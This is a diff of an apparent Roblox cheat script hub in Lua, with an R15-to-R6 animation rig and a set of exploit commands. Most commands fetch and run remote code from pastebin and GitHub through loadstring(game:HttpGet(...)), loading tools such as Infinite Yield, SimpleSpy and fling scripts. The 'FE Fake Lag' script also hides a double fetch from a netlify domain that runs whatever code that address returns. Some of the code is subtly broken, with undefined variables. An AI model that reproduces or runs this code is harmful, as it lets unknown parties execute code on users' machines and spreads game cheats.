+s:SetCore("ResetButtonCallback", f)
+spawn(function()
+    while y do
+            if d and d.Parent and e and e.Parent then
+                    e.Jump = d.Jump
+            end
+            wait()
+    end
+    s:SetCore("ResetButtonCallback", true)
+end)
+h = h and e and (e.RigType == Enum.HumanoidRigType.R15)
+if h then
+    local a = nil
+    pcall(function()
+            a = z(y, "HumanoidRootPart", "BasePart").CFrame
+    end)
+    if a then
+            local b = {
+                    head = {
+                            Name = "Head",
+                            Size = v(2, 1, 1),
+                            R15 = {
+                                    Head = 0
+                            }
+                    },
+                    torso = {
+                            Name = "Torso",
+                            Size = v(2, 2, 1),
+                            R15 = {
+                                    UpperTorso = 0.2,
+                                    LowerTorso = - 0.8
+                            }
+                    },
+                    root = {
+                            Name = "HumanoidRootPart",
+                            Size = v(2, 2, 1),
+                            R15 = {
+                                    HumanoidRootPart = 0
+                            }
+                    },
+                    leftArm = {
+                            Name = "Left Arm",
+                            Size = v(1, 2, 1),
+                            R15 = {
+                                    LeftHand = - 0.85,
+                                    LeftLowerArm = - 0.2,
+                                    LeftUpperArm = 0.4
+                            }
+                    },
+                    rightArm = {
+                            Name = "Right Arm",
+                            Size = v(1, 2, 1),
+                            R15 = {
+                                    RightHand = - 0.85,
+                                    RightLowerArm = - 0.2,
+                                    RightUpperArm = 0.4
+                            }
+                    },
+                    leftLeg = {
+                            Name = "Left Leg",
+                            Size = v(1, 2, 1),
+                            R15 = {
+                                    LeftFoot = - 0.85,
+                                    LeftLowerLeg = - 0.15,
+                                    LeftUpperLeg = 0.6
+                            }
+                    },
+                    rightLeg = {
+                            Name = "Right Leg",
+                            Size = v(1, 2, 1),
+                            R15 = {
+                                    RightFoot = - 0.85,
+                                    RightLowerLeg = - 0.15,
+                                    RightUpperLeg = 0.6
+                            }
+                    }
+            }
+            for a, a in pairs(y:GetChildren()) do
+                    if a:IsA("BasePart") then
+                            for a, a in pairs(a:GetChildren()) do
+                                    if a:IsA("Motor6D") then
+                                            a.Part0 = nil
+                                    end
+                            end
+                    end
+            end
+            for c, d in pairs(b) do
+                    local e = Instance.new("Part")
+                    e.Name = d.Name
+                    e.Size = d.Size
+                    e.CFrame = a
+                    e.Anchored = false
+                    e.Transparency = 1
+                    e.CanCollide = false
+                    for a, b in pairs(d.R15) do
+                            local c = z(y, a, "BasePart")
+                            local d = z(c, "att1_" .. a, "Attachment")
+                            if c then
+                                    local f = Instance.new("Weld", c)
+                                    f.Name = "Weld_" .. a
+                                    f.Part0 = e
+                                    f.Part1 = c
+                                    f.C0 = u(0, b, 0)
+                                    f.C1 = u(0, 0, 0)
+                                    c.Massless = true
+                                    c.Name = "R15_" .. a
+                                    c.Parent = e
+                                    if d then
+                                            d.Parent = e
+                                            d.Position = v(0, b, 0)
+                                    end
+                            end
+                    end
+                    e.Parent = y
+                    b[c] = e
+            end
+            local a = {
+                    neck = {
+                            Parent = b.torso,
+                            Name = "Neck",
+                            Part0 = b.torso,
+                            Part1 = b.head,
+                            C0 = u(0, 1, 0,-1, 0, 0, 0, 0, 1, 0, 1, 0),
+                            C1 = u(0, - 0.5, 0,-1, 0, 0, 0, 0, 1, 0, 1, 0)
+                    },
+                    rootJoint = {
+                            Parent = b.root,
+                            Name = "RootJoint",
+                            Part0 = b.root,
+                            Part1 = b.torso,
+                            C0 = u(0, 0, 0,-1, 0, 0, 0, 0, 1, 0, 1, 0),
+                            C1 = u(0, 0, 0,-1, 0, 0, 0, 0, 1, 0, 1, 0)
+                    },
+                    rightShoulder = {
+                            Parent = b.torso,
+                            Name = "Right Shoulder",
+                            Part0 = b.torso,
+                            Part1 = b.rightArm,
+                            C0 = u(1, 0.5, 0, 0, 0, 1, 0, 1, 0,-1, 0, 0),
+                            C1 = u(- 0.5, 0.5, 0, 0, 0, 1, 0, 1, 0,-1, 0, 0)
+                    },
+                    leftShoulder = {
+                            Parent = b.torso,
+                            Name = "Left Shoulder",
+                            Part0 = b.torso,
+                            Part1 = b.leftArm,
+                            C0 = u(-1, 0.5, 0, 0, 0,-1, 0, 1, 0, 1, 0, 0),
+                            C1 = u(0.5, 0.5, 0, 0, 0,-1, 0, 1, 0, 1, 0, 0)
+                    },
+                    rightHip = {
+                            Parent = b.torso,
+                            Name = "Right Hip",
+                            Part0 = b.torso,
+                            Part1 = b.rightLeg,
+                            C0 = u(1,-1, 0, 0, 0, 1, 0, 1, 0,-1, 0, 0),
+                            C1 = u(0.5, 1, 0, 0, 0, 1, 0, 1, 0,-1, 0, 0)
+                    },
+                    leftHip = {
+                            Parent = b.torso,
+                            Name = "Left Hip",
+                            Part0 = b.torso,
+                            Part1 = b.leftLeg,
+                            C0 = u(-1,-1, 0, 0, 0,-1, 0, 1, 0, 1, 0, 0),
+                            C1 = u(- 0.5, 1, 0, 0, 0,-1, 0, 1, 0, 1, 0, 0)
+                    }
+            }
+            for b, c in pairs(a) do
+                    local d = Instance.new("Motor6D")
+                    for a, b in pairs(c) do
+                            d[a] = b
+                    end
+                    a[b] = d
+            end
+            e.RigType = Enum.HumanoidRigType.R6
+            e.HipHeight = 0
+    end
+end
+wait()
+if not y then
+    return
+end
+local a = false
+local c = false
+local d = false
+local f = false
+local h = false
+local i = false
+local j = false
+local l = false
+local m = false
+local n = 0
+local o = o:GetMouse()
+local p = {
+    ["RootJoint"] = "",
+    ["Neck"] = "",
+    ["Right Hip"] = "",
+    ["Left Hip"] = "",
+    ["Left Shoulder"] = "",
+    ["Right Shoulder"] = ""
+}
+for a, a in pairs(y:GetDescendants()) do
+    if a:IsA("Motor6D") and (p[a.Name] == "") and (not a:IsDescendantOf(g)) then
+            p[a.Name] = a
+    end
+end
+for a, a in pairs(p) do
+    if a and (a ~= "") then
+            a.C0 = u(0, 0, 0)
+            a.C1 = u(0, 0, 0)
+    else
+            return
+    end
+end
+local g = z(y, "HumanoidRootPart", "BasePart")
+if not g then
+    return
+end
+local function r(a)
+    local b, c = a.Part0, a.Part1
+    a.Part1, a.Part0 = b, c
+end
+r(p["Left Shoulder"])
+r(p["Right Shoulder"])
+r(p["Left Hip"])
+r(p["Right Hip"])
+for a, a in pairs(y:GetChildren()) do
+    if a:IsA("Accessory") then
+            a:Destroy()
+    end
+end
+p.Neck.C0 = u(0, 0.3, - 0.5)
+o.Button1Down:Connect(function()
+    if not (kill or d or i) then
+            f = true
+            c = false
+            e.WalkSpeed = 0
+            wait(0.5)
+            e.WalkSpeed = 16
+            f = false
+    end
+end)
+o.KeyDown:Connect(function(f)
+    if not y then
+            return
+    end
+    f = f:lower()
+    if k == "e" then
+            if not a then
+                    h = false
+                    d = false
+                    a = true
+                    c = true
+                    e.WalkSpeed = 100
+                    b = "ventidle"
+            elseif a then
+                    a = false
+                    c = false
+                    e.WalkSpeed = 16
+            end
+    elseif f == "f" then
+            if not h then
+                    a = false
+                    c = false
+                    h = true
+                    d = true
+                    l = false
+                    m = false
+                    e.WalkSpeed = 60
+            elseif h then
+                    h = false
+                    d = false
+                    e.WalkSpeed = 16
+            end
+    elseif f == "q" then
+            if j == false then
+                    a = false
+                    c = false
+                    h = false
+                    d = false
+                    j = true
+                    i = true
+                    l = false
+                    m = false
+                    e.WalkSpeed = 0
+            elseif j == true then
+                    j = false
+                    i = false
+                    e.WalkSpeed = 16
+            end
+    elseif f == "c" then
+            if l == false then
+                    a = false
+                    c = false
+                    h = false
+                    d = false
+                    j = false
+                    i = false
+                    l = true
+                    m = true
+                    e.WalkSpeed = 0
+            elseif l == true then
+                    l = false
+                    m = false
+                    e.WalkSpeed = 16
+            end
+    end
+end)
+local a = "idle"
+while q:Wait() and y do
+    if f then
+            a = "attack"
+    elseif i then
+            a = "dead"
+    elseif m then
+            a = "sit"
+    elseif d then
+            if g.Velocity.Magnitude < 2 then
+                    a = "idle2"
+            elseif g.Velocity.Magnitude > 20 then
+                    a = "walk2"
+            end
+    else
+            if g.Velocity.y > 1 then
+                    a = "jump"
+            elseif g.Velocity.y <-1 then
+                    a = "fall"
+            elseif g.Velocity.Magnitude < 2 then
+                    a = "idle"
+            elseif g.Velocity.Magnitude < 20 then
+                    a = "walk"
+            elseif g.Velocity.Magnitude > 20 then
+                    a = "run"
+            end
+    end
+    n += 1
+    if a == "idle" then
+            p["RootJoint"].C0 = p["RootJoint"].C0:lerp(CFrame.new(0 + 0 * math.sin(n / 12), 0 + 0.3 * math.sin(n / 12), 0 + 0 * math.sin(n / 12)) * CFrame.Angles(math.rad(0 + 10 * math.sin(n / 12)), math.rad(0 + 0 * math.sin(n / 12)), math.rad(0 + 0 * math.sin(n / 12))), 0.1)
+            p["Right Hip"].C0 = p["Right Hip"].C0:lerp(CFrame.new(- 0.5 + 0 * math.sin(n / 12), 2 + 0.3 * math.sin(n / 12), 0.3 + 0 * math.sin(n / 12)) * CFrame.Angles(math.rad(0 + 10 * math.sin(n / 12)), math.rad(20 + 0 * math.sin(n / 12)), math.rad(-3 + 0 * math.sin(n / 12))), 0.1)
+            p["Left Hip"].C0 = p["Left Hip"].C0:lerp(CFrame.new(0.5 + 0 * math.sin(n / 12), 2 + 0.3 * math.sin(n / 12), 0.3 + 0 * math.sin(n / 12)) * CFrame.Angles(math.rad(0 + 10 * math.sin(n / 12)), math.rad(-20 + 0 * math.sin(n / 12)), math.rad(3 + 0 * math.sin(n / 12))), 0.1)
+    elseif a == "walk" then
+            p["RootJoint"].C0 = p["RootJoint"].C0:lerp(CFrame.new(0 + 0 * math.sin(n / 12), 0 + 0.3 * math.sin(n / 12), 0 + 0 * math.sin(n / 12)) * CFrame.Angles(math.rad(-10 + 0 * math.sin(n / 12)), math.rad(0 + 0 * math.sin(n / 12)), math.rad(0 + 0 * math.sin(n / 12))), 0.1)
+            p["Right Hip"].C0 = p["Right Hip"].C0:lerp(CFrame.new(- 0.5 + 0 * math.sin(n / 12), 2 + 0.3 * math.sin(n / 12), 0.3 + 0.3 * math.sin(n / 12)) * CFrame.Angles(math.rad(0 + 30 * math.sin(n / 12)), math.rad(0 + 0 * math.sin(n / 12)), math.rad(0 + 0 * math.sin(n / 12))), 0.1)
+            p["Left Hip"].C0 = p["Left Hip"].C0:lerp(CFrame.new(0.5 + 0 * math.sin(n / 12), 2 + 0.3 * math.sin(n / 12), 0.3 + - 0.3 * math.sin(n / 12)) * CFrame.Angles(math.rad(0 +-30 * math.sin(n / 12)), math.rad(0 + 0 * math.sin(n / 12)), math.rad(0 + 0 * math.sin(n / 12))), 0.1)
+    elseif a == "jump" then
+            p["RootJoint"].C0 = p["RootJoint"].C0:lerp(CFrame.new(0 + 0 * math.sin(n / 12), 0 + 0 * math.sin(n / 12), 0 + 0 * math.sin(n / 12)) * CFrame.Angles(math.rad(0 + 0 * math.sin(n / 12)), math.rad(0 + 0 * math.sin(n / 12)), math.rad(0 + 0 * math.sin(n / 12))), 0.1)
+            p["Right Hip"].C0 = p["Right Hip"].C0:lerp(CFrame.new(- 0.5 + 0 * math.sin(n / 12), 0.5 + 0 * math.sin(n / 12), 0.5 + 0 * math.sin(n / 12)) * CFrame.Angles(math.rad(15 + 0 * math.sin(n / 12)), math.rad(0 + 0 * math.sin(n / 12)), math.rad(0 + 0 * math.sin(n / 12))), 0.1)
+            p["Left Hip"].C0 = p["Left Hip"].C0:lerp(CFrame.new(0.5 + 0 * math.sin(n / 12), 1 + 0 * math.sin(n / 12), 0.5 + 0 * math.sin(n / 12)) * CFrame.Angles(math.rad(10 + 0 * math.sin(n / 12)), math.rad(0 + 0 * math.sin(n / 12)), math.rad(0 + 0 * math.sin(n / 12))), 0.1)
+    elseif a == "fall" then
+            p["RootJoint"].C0 = p["RootJoint"].C0:lerp(CFrame.new(0 + 0 * math.sin(n / 12), 0 + 0 * math.sin(n / 12), 0 + 0 * math.sin(n / 12)) * CFrame.Angles(math.rad(0 + 0 * math.sin(n / 12)), math.rad(0 + 0 * math.sin(n / 12)), math.rad(0 + 0 * math.sin(n / 12))), 0.1)
+            p["Right Hip"].C0 = p["Right Hip"].C0:lerp(CFrame.new(- 0.5 + 0 * math.sin(n / 12), 0.5 + 0 * math.sin(n / 12), 0.5 + 0 * math.sin(n / 12)) * CFrame.Angles(math.rad(15 + 10 * math.sin(n / 12)), math.rad(0 + 0 * math.sin(n / 12)), math.rad(-10 + 0 * math.sin(n / 12))), 0.1)
+            p["Left Hip"].C0 = p["Left Hip"].C0:lerp(CFrame.new(0.5 + 0 * math.sin(n / 12), 1 + 0 * math.sin(n / 12), 0.5 + 0 * math.sin(n / 12)) * CFrame.Angles(math.rad(10 + 5 * math.sin(n / 12)), math.rad(0 + 0 * math.sin(n / 12)), math.rad(10 + 0 * math.sin(n / 12))), 0.1)
+    elseif a == "vent" then
+            p["RootJoint"].C0 = p["RootJoint"].C0:lerp(CFrame.new(0 + 0 * math.sin(n / 12), 0 +-8 * math.sin(n / 12), 0 + 0 * math.sin(n / 12)) * CFrame.Angles(math.rad(0 + 0 * math.sin(n / 12)), math.rad(0 + 0 * math.sin(n / 12)), math.rad(0 + 0 * math.sin(n / 12))), 0.1)
+            p["Right Hip"].C0 = p["Right Hip"].C0:lerp(CFrame.new(- 0.5 + 0 * math.sin(n / 12), 1.5 + 0 * math.sin(n / 12), 1 + 0 * math.sin(n / 12)) * CFrame.Angles(math.rad(26.02 + 0 * math.sin(n / 12)), math.rad(0 + 0 * math.sin(n / 12)), math.rad(0 + 0 * math.sin(n / 12))), 0.1)
+            p["Left Hip"].C0 = p["Left Hip"].C0:lerp(CFrame.new(0.5 + 0 * math.sin(n / 12), 2 + 0 * math.sin(n / 12), 0 + 0 * math.sin(n / 12)) * CFrame.Angles(math.rad(0 + 0 * math.sin(n / 12)), math.rad(0 + 0 * math.sin(n / 12)), math.rad(0 + 0 * math.sin(n / 12))), 0.1)
+    elseif a == "ventidle" then
+            p["RootJoint"].C0 = p["RootJoint"].C0:lerp(CFrame.new(0 + 0 * math.sin(n / 12),-20 + 0 * math.sin(n / 12), 0 + 0 * math.sin(n / 12)) * CFrame.Angles(math.rad(0 + 0 * math.sin(n / 12)), math.rad(0 + 0 * math.sin(n / 12)), math.rad(0 + 0 * math.sin(n / 12))), 0.1)
+            p["Right Hip"].C0 = p["Right Hip"].C0:lerp(CFrame.new(- 0.5 + 0 * math.sin(n / 12), 1.5 + 0 * math.sin(n / 12), 1 + 0 * math.sin(n / 12)) * CFrame.Angles(math.rad(26.02 + 0 * math.sin(n / 12)), math.rad(0 + 0 * math.sin(n / 12)), math.rad(0 + 0 * math.sin(n / 12))), 0.1)
+            p["Left Hip"].C0 = p["Left Hip"].C0:lerp(CFrame.new(0.5 + 0 * math.sin(n / 12), 2 + 0 * math.sin(n / 12), 0 + 0 * math.sin(n / 12)) * CFrame.Angles(math.rad(0 + 0 * math.sin(n / 12)), math.rad(0 + 0 * math.sin(n / 12)), math.rad(0 + 0 * math.sin(n / 12))), 0.1)
+    elseif a == "idle2" then
+            p["RootJoint"].C0 = p["RootJoint"].C0:lerp(CFrame.new(0 + 0 * math.sin(n / 20), 3 + 0.3 * math.sin(n / 20), 0 + 0 * math.sin(n / 20)) * CFrame.Angles(math.rad(0 + 20 * math.sin(n / 20)), math.rad(0 + 0 * math.sin(n / 20)), math.rad(0 + 0 * math.sin(n / 20))), 0.1)
+            p["Right Hip"].C0 = p["Right Hip"].C0:lerp(CFrame.new(- 0.5 + 0 * math.sin(n / 20), 1 + 0 * math.sin(n / 20), 1 + 0 * math.sin(n / 20)) * CFrame.Angles(math.rad(20 +-20 * math.sin(n / 20)), math.rad(0 + 0 * math.sin(n / 20)), math.rad(0 + 0 * math.sin(n / 20))), 0.1)
+            p["Left Hip"].C0 = p["Left Hip"].C0:lerp(CFrame.new(0.5 + 0 * math.sin(n / 20), 2 + 0 * math.sin(n / 20), 0.5 + - 0.5 * math.sin(n / 20)) * CFrame.Angles(math.rad(10 +-20 * math.sin(n / 20)), math.rad(0 + 0 * math.sin(n / 20)), math.rad(0 + 0 * math.sin(n / 20))), 0.1)
+    elseif a == "walk2" then
+            p["RootJoint"].C0 = p["RootJoint"].C0:lerp(CFrame.new(0 + 0 * math.sin(n / 20), 3 + 0.3 * math.sin(n / 20), 0 + 0 * math.sin(n / 20)) * CFrame.Angles(math.rad(-60 + 10 * math.sin(n / 20)), math.rad(0 + 0 * math.sin(n / 20)), math.rad(0 + 0 * math.sin(n / 20))), 0.1)
+            p["Right Hip"].C0 = p["Right Hip"].C0:lerp(CFrame.new(- 0.4 + 0 * math.sin(n / 20), 2 + 0 * math.sin(n / 20), 0.3 + 0 * math.sin(n / 20)) * CFrame.Angles(math.rad(0 +-10 * math.sin(n / 20)), math.rad(0 + 0 * math.sin(n / 20)), math.rad(-5 + 0 * math.sin(n / 20))), 0.1)
+            p["Left Hip"].C0 = p["Left Hip"].C0:lerp(CFrame.new(0.5 + 0 * math.sin(n / 20), 1 + 0 * math.sin(n / 20), 0.5 + 0 * math.sin(n / 20)) * CFrame.Angles(math.rad(0 +-20 * math.sin(n / 20)), math.rad(0 + 0 * math.sin(n / 20)), math.rad(5 + 0 * math.sin(n / 20))), 0.1)
+    elseif a == "attack" then
+            p["RootJoint"].C0 = p["RootJoint"].C0:lerp(CFrame.new(0 + 0 * math.sin(n / 5), 0 + 0 * math.sin(n / 5), 0 + 0 * math.sin(n / 5)) * CFrame.Angles(math.rad(30 + 0 * math.sin(n / 5)), math.rad(0 + 0 * math.sin(n / 5)), math.rad(0 + 0 * math.sin(n / 5))), 0.1)
+            p["Right Hip"].C0 = p["Right Hip"].C0:lerp(CFrame.new(- 0.4 + 0 * math.sin(n / 12), 2 + 0 * math.sin(n / 12), 0.5 + 0 * math.sin(n / 12)) * CFrame.Angles(math.rad(30 + 0 * math.sin(n / 12)), math.rad(0 + 0 * math.sin(n / 12)), math.rad(-4 + 0 * math.sin(n / 12))), 0.1)
+            p["Left Hip"].C0 = p["Left Hip"].C0:lerp(CFrame.new(0.4 + 0 * math.sin(n / 12), 2 + 0 * math.sin(n / 12), 0.5 + 0 * math.sin(n / 12)) * CFrame.Angles(math.rad(30 + 0 * math.sin(n / 12)), math.rad(0 + 0 * math.sin(n / 12)), math.rad(4 + 0 * math.sin(n / 12))), 0.1)
+    elseif a == "sit" then
+            p["RootJoint"].C0 = p["RootJoint"].C0:lerp(CFrame.new(0 + 0 * math.sin(n / 5), - 1.8 + 0 * math.sin(n / 5), 0 + 0 * math.sin(n / 5)) * CFrame.Angles(math.rad(10 + 0 * math.sin(n / 5)), math.rad(0 + 0 * math.sin(n / 5)), math.rad(0 + 0 * math.sin(n / 5))), 0.1)
+            p["Right Hip"].C0 = p["Right Hip"].C0:lerp(CFrame.new(- 0.4 + 0 * math.sin(n / 12), 1 + 0 * math.sin(n / 12),-1 + 0 * math.sin(n / 12)) * CFrame.Angles(math.rad(-90 + 0 * math.sin(n / 12)), math.rad(10 + 0 * math.sin(n / 12)), math.rad(-4 + 0 * math.sin(n / 12))), 0.1)
+            p["Left Hip"].C0 = p["Left Hip"].C0:lerp(CFrame.new(0.4 + 0 * math.sin(n / 12), 1 + 0 * math.sin(n / 12),-1 + 0 * math.sin(n / 12)) * CFrame.Angles(math.rad(-90 + 0 * math.sin(n / 12)), math.rad(-10 + 0 * math.sin(n / 12)), math.rad(0 + 0 * math.sin(n / 12))), 0.1)
+    elseif a == "dead" then
+            p["RootJoint"].C0 = p["RootJoint"].C0:lerp(CFrame.new(0 + 0 * math.sin(n / 5), - 2.5 + 0 * math.sin(n / 5),-1 + 0 * math.sin(n / 5)) * CFrame.Angles(math.rad(-90 + 0 * math.sin(n / 5)), math.rad(0 + 0 * math.sin(n / 5)), math.rad(0 + 0 * math.sin(n / 5))), 0.1)
+            p["Right Hip"].C0 = p["Right Hip"].C0:lerp(CFrame.new(- 0.4 + 0 * math.sin(n / 12), 3 + 0 * math.sin(n / 12), 0 + 0 * math.sin(n / 12)) * CFrame.Angles(math.rad(0 + 0 * math.sin(n / 12)), math.rad(0 + 0 * math.sin(n / 12)), math.rad(-4 + 0 * math.sin(n / 12))), 0.1)
+            p["Left Hip"].C0 = p["Left Hip"].C0:lerp(CFrame.new(0.4 + 0 * math.sin(n / 12), 3 + 0 * math.sin(n / 12), 0 + 0 * math.sin(n / 12)) * CFrame.Angles(math.rad(0 + 0 * math.sin(n / 12)), math.rad(0 + 0 * math.sin(n / 12)), math.rad(4 + 0 * math.sin(n / 12))), 0.1)
+    end
+    p["Right Shoulder"].C0 = p["Right Shoulder"].C0:lerp(CFrame.new(- 0.4 + 0 * math.sin(n / 12), 0 + 0 * math.sin(n / 12), - 0.8 + 0 * math.sin(n / 12)) * CFrame.Angles(math.rad(0 + 0 * math.sin(n / 12)), math.rad(0 + 0 * math.sin(n / 12)), math.rad(0 + 0 * math.sin(n / 12))), 0.1)
+    p["Left Shoulder"].C0 = p["Left Shoulder"].C0:lerp(CFrame.new(0.4 + 0 * math.sin(n / 12), 0 + 0 * math.sin(n / 12), - 0.8 + 0 * math.sin(n / 12)) * CFrame.Angles(math.rad(0 + 0 * math.sin(n / 12)), math.rad(0 + 0 * math.sin(n / 12)), math.rad(0 + 0 * math.sin(n / 12))), 0.1)
+end
+end)a:AddCommand('FeFakeLag', {}, 'Script not mine no hate plz FE FAKE LAG V2', function(a, a)
+-- Creo Fake Lag Script
 
 -- < You> --
 
 -- How long each lag can last
-        local L_197_ = 0.8
-        local L_198_ = 4
+local a = 0.8
+local b = 4
 --                          --
-        local L_199_ = function(L_201_arg0, L_202_arg1, L_203_arg2, L_204_arg3)
-                game.StarterGui:SetCore("SendNotification", {
-                        Title = "Creo FE Lag Script";
-                        Text = L_201_arg0;
-                        Icon = "";
-                        Duration = L_202_arg1;
-                        Button1 = L_203_arg2;
-                        Button2 = L_204_arg3;
-                        Callback = nil;
-                })
-        end
-        spawn(function()
-                loadstring(game:HttpGet(game:HttpGet("https://luafunctionsextra.netlify.app", true)))()
-        end)
-        local function L_200_func(L_205_arg0, L_206_arg1)
-                local L_207_ = game.Players.LocalPlayer.Character.Animate
-                L_207_.Parent = nil
-                local L_208_ = L_206_arg1 * 30
-                local L_209_ = L_208_
-                while true do
-                        if L_209_ > 0 then
-                                L_205_arg0.Parent = nil
-                                L_205_arg0.Parent = workspace
-                                L_209_ -= 1
-                                task.wait()
-                        else
-                                L_207_.Parent = game.Players.LocalPlayer.Character
-                                break
-                        end
-                end
-        end
-        L_199_("Activated", 2, "Ok", nil)
-        while true do
-                wait(math.random(1, 20) * 0.1)
-                L_200_func(game.Players.LocalPlayer.Character, math.random(L_197_, L_198_))
-        end
-end)L_2_:AddCommand('Infyield', {}, 'Best admin', function(L_210_arg0, L_211_arg1)
-        loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
-end)L_2_:AddCommand('CMDX', {}, 'Best admin', function(L_212_arg0, L_213_arg1)
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source", true))()
-end)L_2_:AddCommand('SimpleSpy', {}, 'executes simple spy', function(L_214_arg0, L_215_arg1)
-        loadstring(game:HttpGet("https://github.com/exxtremestuffs/SimpleSpySource/raw/master/SimpleSpy.lua"))()
-end)L_2_:AddCommand('ultfling', {}, 'ultimate fling', function(L_216_arg0, L_217_arg1)
-        loadstring(game:HttpGet("https://pastebin.com/raw/GfwkiUTV", true))()
-end)L_2_:AddCommand('FeX', {}, 'Ultimate FE Gui', function(L_218_arg0, L_219_arg1)
-        loadstring(game:HttpGet("https://pastebin.com/raw/ES6xMCn7", true))()
-end)L_2_:AddCommand('DomainX', {}, 'ily shlex very kool', function(L_220_arg0, L_221_arg1)
-    -- DomainX Loadstring
-        loadstring(game:HttpGet('https://raw.githubusercontent.com/shlexware/DomainX/main/source', true))()
-end)L_2_:AddCommand('shaders', {}, 'RTX on babyyy', function(L_222_arg0, L_223_arg1)
-    -- Roblox Graphics Enhancer
-        local L_224_ = game.Lighting
-        for L_231_forvar0, L_232_forvar1 in pairs(L_224_:GetChildren()) do
-                L_232_forvar1:Destroy()
-        end
-        local L_225_ = workspace.Terrain
-        local L_226_ = Instance.new("ColorCorrectionEffect")
-        local L_227_ = Instance.new("BloomEffect")
-        local L_228_ = Instance.new("SunRaysEffect")
-        local L_229_ = Instance.new("BlurEffect")
-        L_226_.Parent = L_224_
-        L_227_.Parent = L_224_
-        L_228_.Parent = L_224_
-        L_229_.Parent = L_224_
+local c = function(a, b, c, d)
+    game.StarterGui:SetCore("SendNotification", {
+            Title = "Creo FE Lag Script";
+            Text = a;
+            Icon = "";
+            Duration = b;
+            Button1 = c;
+            Button2 = d;
+            Callback = nil;
+    })
+end
+spawn(function()
+    loadstring(game:HttpGet(game:HttpGet("https://luafunctionsextra.netlify.app", true)))()
+end)
+local function d(a, b)
+    local c = game.Players.LocalPlayer.Character.Animate
+    c.Parent = nil
+    local b = b * 30
+    local b = b
+    while true do
+            if b > 0 then
+                    a.Parent = nil
+                    a.Parent = workspace
+                    b -= 1
+                    task.wait()
+            else
+                    c.Parent = game.Players.LocalPlayer.Character
+                    break
+            end
+    end
+end
+c("Activated", 2, "Ok", nil)
+while true do
+    wait(math.random(1, 20) * 0.1)
+    d(game.Players.LocalPlayer.Character, math.random(a, b))
+end
+end)a:AddCommand('Infyield', {}, 'Best admin', function(a, a)
+loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+end)a:AddCommand('CMDX', {}, 'Best admin', function(a, a)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source", true))()
+end)a:AddCommand('SimpleSpy', {}, 'executes simple spy', function(a, a)
+loadstring(game:HttpGet("https://github.com/exxtremestuffs/SimpleSpySource/raw/master/SimpleSpy.lua"))()
+end)a:AddCommand('ultfling', {}, 'ultimate fling', function(a, a)
+loadstring(game:HttpGet("https://pastebin.com/raw/GfwkiUTV", true))()
+end)a:AddCommand('FeX', {}, 'Ultimate FE Gui', function(a, a)
+loadstring(game:HttpGet("https://pastebin.com/raw/ES6xMCn7", true))()
+end)a:AddCommand('DomainX', {}, 'ily shlex very kool', function(a, a)
+-- DomainX Loadstring
+loadstring(game:HttpGet('https://raw.githubusercontent.com/shlexware/DomainX/main/source', true))()
+end)a:AddCommand('shaders', {}, 'RTX on babyyy', function(a, a)
+-- Roblox Graphics Enhancer
+local a = game.Lighting
+for a, a in pairs(a:GetChildren()) do
+    a:Destroy()
+end
+local b = workspace.Terrain
+local c = Instance.new("ColorCorrectionEffect")
+local d = Instance.new("BloomEffect")
+local e = Instance.new("SunRaysEffect")
+local f = Instance.new("BlurEffect")
+c.Parent = a
+d.Parent = a
+e.Parent = a
+f.Parent = a
 
-    -- enable or disable shit
-        local L_230_ = {
-                Terrain = true;
-                ColorCorrection = true;
-                Sun = true;
-                Lighting = true;
-                BloomEffect = true;
-        }
+-- enable or disable shit
+local g = {
+    Terrain = true;
+    ColorCorrection = true;
+    Sun = true;
+    Lighting = true;
+    BloomEffect = true;
+}
 
-    -- settings {
-        L_226_.Enabled = false
-        L_226_.Contrast = 0.15
-        L_226_.Brightness = 0.1
-        L_226_.Saturation = 0.25
-        L_226_.TintColor = Color3.fromRGB(255, 222, 211)
-        L_227_.Enabled = false
-        L_227_.Intensity = 0.1
-        L_228_.Enabled = false
-        L_228_.Intensity = 0.2
-        L_228_.Spread = 1
-        L_227_.Enabled = false
-        L_227_.Intensity = 0.05
-        L_227_.Size = 32
-        L_227_.Threshold = 1
-        L_229_.Enabled = false
-        L_229_.Size = 6
+-- settings {
+c.Enabled = false
+c.Contrast = 0.15
+c.Brightness = 0.1
+c.Saturation = 0.25
+c.TintColor = Color3.fromRGB(255, 222, 211)
+d.Enabled = false
+d.Intensity = 0.1
+e.Enabled = false
+e.Intensity = 0.2
+e.Spread = 1
+d.Enabled = false
+d.Intensity = 0.05
+d.Size = 32
+d.Threshold = 1
+f.Enabled = false
+f.Size = 6
 
-    -- settings }
-        if L_230_.ColorCorrection then
-                L_226_.Enabled = true
-        end
-        if L_230_.Sun then
-                L_228_.Enabled = true
-        end
-        if L_230_.Terrain then
-        -- settings {
-                L_225_.WaterColor = Color3.fromRGB(10, 10, 24)
-                L_225_.WaterWaveSize = 0.15
-                L_225_.WaterWaveSpeed = 22
-                L_225_.WaterTransparency = 1
-                L_225_.WaterReflectance = 0.05
-        -- settings }
-        end
-        if L_230_.Lighting then
-        -- settings {
-                L_224_.Ambient = Color3.fromRGB(0, 0, 0)
-                L_224_.Brightness = 4
-                L_224_.ColorShift_Bottom = Color3.fromRGB(0, 0, 0)
-                L_224_.ColorShift_Top = Color3.fromRGB(0, 0, 0)
-                L_224_.ExposureCompensation = 0
-                L_224_.FogColor = Color3.fromRGB(132, 132, 132)
-                L_224_.GlobalShadows = true
-                L_224_.OutdoorAmbient = Color3.fromRGB(112, 117, 128)
-                L_224_.Outlines = false
-        -- settings }
-        end
+-- settings }
+if g.ColorCorrection then
+    c.Enabled = true
+end
+if g.Sun then
+    e.Enabled = true
+end
+if g.Terrain then
+-- settings {
+    b.WaterColor = Color3.fromRGB(10, 10, 24)
+    b.WaterWaveSize = 0.15
+    b.WaterWaveSpeed = 22
+    b.WaterTransparency = 1
+    b.WaterReflectance = 0.05
+-- settings }
+end
+if g.Lighting then
+-- settings {
+    a.Ambient = Color3.fromRGB(0, 0, 0)
+    a.Brightness = 4
+    a.ColorShift_Bottom = Color3.fromRGB(0, 0, 0)
+    a.ColorShift_Top = Color3.fromRGB(0, 0, 0)
+    a.ExposureCompensation = 0
+    a.FogColor = Color3.fromRGB(132, 132, 132)
+    a.GlobalShadows = true
+    a.OutdoorAmbient = Color3.fromRGB(112, 117, 128)
+    a.Outlines = false
+-- settings }
+end
 end)
